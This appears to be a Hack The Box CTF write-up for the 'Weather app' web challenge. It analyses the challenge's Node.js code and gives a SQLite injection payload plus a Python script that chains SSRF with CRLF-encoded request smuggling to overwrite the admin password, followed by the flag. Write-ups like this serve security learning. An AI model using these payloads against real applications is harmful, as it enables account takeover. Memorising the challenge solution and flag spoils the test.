---
title: Weather app
date: 2025-02-05
author: Flavien
draft: false
tags:
  - CTF
  - HTB
  - Challenge
  - Web
  - Veasy
  - Smuggling
  - SSRF
categories:
  - Writeup
  - Challenge
  - Web
description: HTB writeup for the easy web challenge "Weather app"
summary: HTB writeup for the easy web challenge "Weather app" which uses a combination of request smuggling, sql injection and ssrf vulnerability to get the flag. Pretty advanced compared to other web challenges.
---

```
A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I'm hallucinating with the memories of my past life, it's a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I've been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that's operating this website and set me free! 🧙‍♀️
```

==> For this challenge we get a live instance as well as a bunch of files:

```bash
.
├── Dockerfile
├── build-docker.sh
├── challenge
│   ├── database.js
│   ├── flag
│   ├── helpers
│   │   ├── HttpHelper.js
│   │   └── WeatherHelper.js
│   ├── index.js
│   ├── package-lock.json
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── css
│   │   │   └── main.css
│   │   ├── favicon.gif
│   │   ├── host-unreachable.jpg
│   │   ├── js
│   │   │   ├── koulis.js
│   │   │   └── main.js
│   │   ├── koulis.gif
│   │   └── weather.gif
│   ├── views
│   │   ├── index.html
│   │   ├── login.html
│   │   └── register.html
│   └── weather-app.db
└── config
    └── supervisord.conf
```

==> Going over to the website, we see it displays the weather for a specific city (`Bienne`in that case) but there does not seem to be any way for us to interact with it. Checking out the source code we see this `main.js`file:

```js
const weather = document.getElementById('weather');

const getWeather = async () => {

    let endpoint = 'api.openweathermap.org';

    let res  = await fetch('//ip-api.com/json/')
        .catch(() => {
            weather.innerHTML = `
                <img src='/static/host-unreachable.jpg'>
                <br><br>
                <h4>👨‍🔧 Disable blocker addons</h2>
            `;
        });

    let data = await res.json();

    let { countryCode, city } = data;

    res = await fetch('/api/weather', {
        method: 'POST',
        body: JSON.stringify({
            endpoint: endpoint,
            city: city,
            country: countryCode,
        }),
        headers: {
            'Content-Type': 'application/json'
        }
    });
    
    data = await res.json();

    if (data.temp) {
        weather.innerHTML = `
            <div class='${data.icon}'></div>
            <h1>City: ${city}</h1>
            <h1>Temp: ${data.temp} C</h1>
            <h3>Status: ${data.desc}</h3>
        `;
    } else {
        weather.innerHTML = `
            <h3>${data.message}</h3>
        `;
    }
};

getWeather();
setInterval(getWeather, 60 * 60 * 1000);
```

and we discover the `/api/weather`endpoint but nothing else that seems really interesting.

==> Looking for the `flag`keyword in the entire directory, we find an occurrence in `/routes/index.js`and can check it out:

```js
const path              = require('path');
const fs                = require('fs');
const express           = require('express');
const router            = express.Router();
const WeatherHelper     = require('../helpers/WeatherHelper');

let db;

const response = data => ({ message: data });

router.get('/', (req, res) => {
        return res.sendFile(path.resolve('views/index.html'));
});

router.get('/register', (req, res) => {
        return res.sendFile(path.resolve('views/register.html'));
});

router.post('/register', (req, res) => {

        if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
                return res.status(401).end();
        }

        let { username, password } = req.body;

        if (username && password) {
                return db.register(username, password)
                        .then(()  => res.send(response('Successfully registered')))
                        .catch(() => res.send(response('Something went wrong')));
        }

        return res.send(response('Missing parameters'));
});

router.get('/login', (req, res) => {
        return res.sendFile(path.resolve('views/login.html'));
});

router.post('/login', (req, res) => {
        let { username, password } = req.body;

        if (username && password) {
                return db.isAdmin(username, password)
                        .then(admin => {
                                if (admin) return res.send(fs.readFileSync('/app/flag').toString());
                                return res.send(response('You are not admin'));
                        })
                        .catch(() => res.send(response('Something went wrong')));
        }

        return re.send(response('Missing parameters'));
});

router.post('/api/weather', (req, res) => {
        let { endpoint, city, country } = req.body;

        if (endpoint && city && country) {
                return WeatherHelper.getWeather(res, endpoint, city, country);
        }

        return res.send(response('Missing parameters'));
});

module.exports = database => { 
        db = database;
        return router;
};               
```

and so there is a `/login`endpoint that we can immediately go to. Trying to login as `admin`does not work for now so we can register a user first under the `/register`endpoint but it does not seem to work as the requests need to be coming from `localhost`:

```js
router.post('/register', (req, res) => {
	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
			return res.status(401).end();
	}
	let { username, password } = req.body;
	if (username && password) {
			return db.register(username, password)
					.then(()  => res.send(response('Successfully registered')))
					.catch(() => res.send(response('Something went wrong')));
	}
	return res.send(response('Missing parameters'));
});
```

==> We can then check the `database.js`file and see what it contains:

```js
const sqlite = require('sqlite-async');
const crypto = require('crypto');

class Database {
    constructor(db_file) {
        this.db_file = db_file;
        this.db = undefined;
    }
    
    async connect() {
        this.db = await sqlite.open(this.db_file);
    }

    async migrate() {
        return this.db.exec(`
            DROP TABLE IF EXISTS users;

            CREATE TABLE IF NOT EXISTS users (
                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
                username   VARCHAR(255) NOT NULL UNIQUE,
                password   VARCHAR(255) NOT NULL
            );

            INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }');
        `);
    }

    async register(user, pass) {
        // TODO: add parameterization and roll public
        return new Promise(async (resolve, reject) => {
            try {
                let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
                resolve((await this.db.run(query)));
            } catch(e) {
                reject(e);
            }
        });
    }

    async isAdmin(user, pass) {
        return new Promise(async (resolve, reject) => {
            try {
                let smt = await this.db.prepare('SELECT username FROM users WHERE username = ? and password = ?');
                let row = await smt.get(user, pass);
                resolve(row !== undefined ? row.username == 'admin' : false);
            } catch(e) {
                reject(e);
            }
        });
    }
}

module.exports = Database;
```

and so we see that it creates the `admin`with a random password, has an `isAdmin`function as well and a `register`function that seems to be vulnerable to `SQLi`as can also be seen with the comment:

```js
async register(user, pass) {
	// TODO: add parameterization and roll public
	return new Promise(async (resolve, reject) => {
		try {
			let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`;
			resolve((await this.db.run(query)));
		} catch(e) {
			reject(e);
		}
	});
}
```

==> This could then be used to update the password with a payload such as:

```sql
123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--
```

we then need to find a way to bypass this check in the `index.js`file:

```js
router.post('/register', (req, res) => {
	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
			return res.status(401).end();
	}
	let { username, password } = req.body;
	if (username && password) {
			return db.register(username, password)
					.then(()  => res.send(response('Successfully registered')))
					.catch(() => res.send(response('Something went wrong')));
	}
	return res.send(response('Missing parameters'));
});
```

==> From here we remember the `/api/weather` endpoint that allowed for `POST`requests and took `endpoint`as a parameter:

```js
let endpoint = 'api.openweathermap.org';

    let res  = await fetch('//ip-api.com/json/')
        .catch(() => {
            weather.innerHTML = `
                <img src='/static/host-unreachable.jpg'>
                <br><br>
                <h4>👨‍🔧 Disable blocker addons</h2>
            `;
        });

    let data = await res.json();

    let { countryCode, city } = data;

    res = await fetch('/api/weather', {
        method: 'POST',
        body: JSON.stringify({
            endpoint: endpoint,
            city: city,
            country: countryCode,
        }),
        headers: {
            'Content-Type': 'application/json'
        }
    });
```

we can then look for a `SSRF`vulnerability in here, which we could use to exploit the `SQLi`identified earlier. Checking the controller for this, we have:

```js
router.post('/api/weather', (req, res) => {
        let { endpoint, city, country } = req.body;

        if (endpoint && city && country) {
                return WeatherHelper.getWeather(res, endpoint, city, country);
        }

        return res.send(response('Missing parameters'));
});
```

==> We see that the `WeatherHelper.getWeather()`function gets called --> we can have a look at it:

```js
const HttpHelper = require('../helpers/HttpHelper');

module.exports = {
    async getWeather(res, endpoint, city, country) {

        // *.openweathermap.org is out of scope
        let apiKey = '10a62430af617a949055a46fa6dec32f';
        let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
        
        if (weatherData.name) {
            let weatherDescription = weatherData.weather[0].description;
            let weatherIcon = weatherData.weather[0].icon.slice(0, -1);
            let weatherTemp = weatherData.main.temp;

            switch (parseInt(weatherIcon)) {
                case 2: case 3: case 4:
                    weatherIcon = 'icon-clouds';
                    break;
                case 9: case 10:
                    weatherIcon = 'icon-rain';
                    break;
                case 11:
                    weatherIcon = 'icon-storm';
                    break;
                case 13:
                    weatherIcon = 'icon-snow';
                    break;
                default:
                    weatherIcon = 'icon-sun';
                    break;
            }

            return res.send({
                desc: weatherDescription,
                icon: weatherIcon,
                temp: weatherTemp,
            });
        } 

        return res.send({
            error: `Could not find ${city} or ${country}`
        });
    }
} 
```

and so it uses the helper function `HttpHelper.HttpGet()`to send a `GET`request and retrieve parameters for this specific city.

==> Now that we have all of this, we can actually make a script to overwrite the admin's password, using both the `SQLi`payload combined with the `SSRF`vulnerability in an encoded `HTTP smuggling request` :

```python
import requests

url = "http://94.237.53.230:40051"

username="admin"

password="123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"
parsedUsername = username.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
parsedPassword = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(parsedUsername) + len(parsedPassword) + 19
endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str (contentLength) + '\u010D\u010A\u010D\u010Ausername='+parsedUsername + '&password='+ parsedPassword + '\u010D\u010A\u010D\u010AGET\u0120/?lol='

city='test'

country='test'

json={'endpoint':endpoint,'city':city,'country':country}

res=requests.post(url=url+'/api/weather',json=json)
```

This will combine both the `SQLi`that we found earlier, by using the `SQLite`'s `ON CONFLICT`keyword to change the `admin` password to `admin`and using `SSRF-based request smuggling` to send the request to the `/register`endpoint.

(For this, we need the different special characters to be encoded such as spaces, newlines, ... We then use these replacements: `\u0120`, `%27`, `%22`)

Once ran, we can simply login as `admin:admin`and we get the flag:

==> **`HTB{w3lc0m3_t0_th3_p1p3_dr34m}`**
